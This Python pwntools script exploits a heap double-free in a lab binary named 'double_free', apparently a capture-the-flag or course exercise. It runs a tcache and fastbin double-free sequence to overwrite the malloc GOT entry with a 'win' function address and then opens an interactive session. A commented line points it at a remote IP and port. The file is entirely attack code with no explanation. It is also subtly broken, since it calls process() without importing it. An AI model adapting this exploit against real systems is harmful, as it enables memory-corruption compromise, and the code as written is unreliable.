#!/usr/bin/python3

from pwn import remote, p64

def clear(io: remote) -> None:
    io.recvuntil(b'e.g, l\n')

def malloc(io: remote) -> None:
    io.sendline(b'm 8')
    clear(io)

def free(io: remote, index: int) -> None:
    io.sendline(f'f { index }'.encode())
    clear(io)

def edit(io: remote, index: int, content: bytes) -> None:
    io.sendline(b'e %d %b' % (index, content))
    clear(io)

def attack(io: remote) -> None:

    for _ in range(9):
        malloc(io)

    for i in range(7):
        free(io, i)

    free(io, 7)
    free(io, 8)
    free(io, 7)

    for _ in range(7):
        malloc(io)

    malloc(io)

    edit(io, 16, p64(0x404078)) # malloc got

    for _ in range(3):
        malloc(io)

    edit(io, 19, p64(0x401948)) # win

    io.sendline(b'm 8')
    # io.recvuntil(b'ASURITE?\n')
    # io.sendline(b'xxx')
    # io.recvuntil(b'repeats.')


    io.interactive()

if __name__ == '__main__':
    # attack(remote('107.21.135.41', 16666))
    attack(process('double_free'))